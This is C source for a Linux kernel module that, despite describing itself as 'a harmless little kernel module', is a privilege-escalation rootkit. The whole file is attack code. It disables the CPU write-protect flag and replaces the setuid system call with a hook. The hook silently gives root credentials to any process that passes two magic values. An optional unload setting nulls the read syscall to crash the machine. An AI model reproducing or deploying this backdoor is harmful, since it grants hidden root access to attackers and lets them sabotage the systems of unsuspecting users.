// Module headers
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>

// Process realted headers
#include <linux/cred.h>	 // struct cred
#include <linux/sched.h> // struct task_struct, current
#include <linux/types.h> // uid_t, gid_t

// Syscalls
#include <asm/unistd.h>
#include <linux/sched/task_stack.h>
#include <linux/set_memory.h>

// Persistence
#include <linux/vmalloc.h>

#define AUTHOR		"threadexio"
#define VERSION		"1.0"
#define LICENSE		"GPL"
#define DESCRIPTION "A harmless little kernel module"

#define SYS_CALL_TABLE_ADDR 0xffffffff904002e0

static int panic_on_unload = 0;
module_param(panic_on_unload, int, 0000);

static int debug = 1;
module_param(debug, int, 0000);

static int magic1 = 0x1337;
module_param(magic1, int, 0000);

static int magic2 = 0xbadbeef;
module_param(magic2, int, 0000);

static int elevate(struct task_struct *task) {
	if (debug)
		printk(KERN_NOTICE "Elevating process: %u\n", task->pid);

	/*
	 * Modify kernel memory directly to change ids, simillar to libc's
	 * setuid, setgid, etc.
	 */
	*(uid_t *)&task->cred->uid = 0;
	*(gid_t *)&task->cred->gid = 0;

	*(uid_t *)&task->cred->suid = 0;
	*(gid_t *)&task->cred->sgid = 0;

	*(uid_t *)&task->cred->euid = 0;
	*(gid_t *)&task->cred->egid = 0;

	*(uid_t *)&task->cred->fsuid = 0;
	*(gid_t *)&task->cred->fsgid = 0;

	return 0;
}

static inline void cr0_write(unsigned long _cr0) {
	asm volatile("mov %0, %%cr0" : : "r"(_cr0));
}

static inline unsigned long cr0_read(void) {
	unsigned long _cr0;
	asm volatile("mov %%cr0, %0" : "=r"(_cr0));
	return _cr0;
}

static inline void _unprotect_mem(void) {
	// Clear the 17th bit of cr0, Write Protect CPU flag
	cr0_write(cr0_read() & (~(1 << 16)));
}

static inline void _protect_mem(void) {
	// Set the 17th bit of cr0, Write Protect CPU flag
	cr0_write(cr0_read() | (1 << 16));
}

//========//

typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);

static sys_call_ptr_t *sys_call_table = (sys_call_ptr_t *)SYS_CALL_TABLE_ADDR;

// static asmlinkage long (*setuid_real)(const struct pt_regs *);
static sys_call_ptr_t setuid_real;

asmlinkage long setuid_hook(const struct pt_regs *regs) {
	struct task_struct   *cur = current;
	const struct pt_regs *ur  = task_pt_regs(cur);
	if (ur->si == magic1 && ur->dx == magic2) {
		elevate(cur);
		return -EPERM;
	}

	return setuid_real(regs);
}

static __init int mod_init(void) {
	if (debug)
		printk(KERN_INFO "Loading setuid() hook...\n");

	setuid_real = sys_call_table[__NR_setuid];

	_unprotect_mem();
	sys_call_table[__NR_setuid] = setuid_hook;
	_protect_mem();

	return 0;
}

static __exit void mod_exit(void) {
	if (debug)
		printk(KERN_INFO "Unloading setuid() hook...\n");

	_unprotect_mem();

	if (panic_on_unload)
		// Just set the handler for one of the most commom syscalls to 0x0, as
		// you can imagine, it doesn't end very well.
		sys_call_table[__NR_read] = NULL;

	sys_call_table[__NR_setuid] = setuid_real;
	_protect_mem();
}

MODULE_LICENSE(LICENSE);
MODULE_AUTHOR(AUTHOR);
MODULE_DESCRIPTION(DESCRIPTION);
MODULE_VERSION(VERSION);

module_init(mod_init);
module_exit(mod_exit);